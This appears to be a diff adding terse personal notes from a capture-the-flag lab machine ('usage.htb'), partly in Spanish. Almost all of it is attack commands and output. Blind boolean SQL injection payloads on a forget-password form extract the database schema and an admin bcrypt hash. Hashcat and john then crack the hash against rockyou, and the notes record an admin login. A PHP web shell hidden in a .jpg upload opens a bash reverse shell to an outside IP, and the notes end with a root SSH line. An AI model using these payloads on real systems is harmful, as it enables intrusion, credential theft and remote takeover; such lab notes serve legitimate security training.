@@ -1,0 +1,43 @@
+10.129.101.10
+[
+	[
+
+		### SQLi  post register  ->>   http://usage.htb/forget-password
+			python3::: ./sqli.py			"database name"
+						[<] Fuerza Bruta: test' or substring(database(),17,1)='r'-- -
+
+			->>>  [|] DataBase: usage_blog
+
+			python3::: ./sqli.py			"tables db"
+						[.] Fuerza Bruta: test' or substring((select group_concat(table_name) from information_schema.tables where table_schema='usage_blog'),207,1)='h'-- -
+			->>>  [ ] DataBase: admin_menu,admin_operation_log,admin_permissions,admin_role_menu,admin_role_permissions,admin_role_users,admin_roles,admin_user_permissions,admin_users,blog,failed_jobs,migrations,password_reset_tokens
+
+			python3:::  ./sqli.py			"columns db"
+						[▝] Fuerza Bruta: test' or substring((select group_concat(column_name) from information_schema.columns where table_schema='usage_blog' and table_name='admin_users'),93,1)='m'-- -
+			->>>	[▘] DataBase: avatar,created_at,id,name,password,remember_token,updated_at,username
+
+			python3::: ./sqli.py     "users : password hash"
+						[◐] Fuerza Bruta: test' or substring((select group_concat((BINARY username), ':', (BINARY password)) from admin_users),288,1)='Y'-- -
+			->>>	[b] DataBase: admin:$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2
+
+		hashcat:::   -a 0 -m 3200 ./hashes.txt /usr/share/wordlists/rockyou.txt -O
+
+			$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2:whatever1
+
+		john:::  ./hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+			
+			whatever1        (?)
+
+			firefox:::    http://admin.usage.htb/       user=> admin   pass=> whatever1
+
+					:: .jpg upload phpCodeIncrusted   <?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.130/443 0>&1'"); ?>
+
+
+
+		 
+	]
+
+	[
+		ssh:::  ssh -i id_rsa root@$(mvnb)
+	]
+]
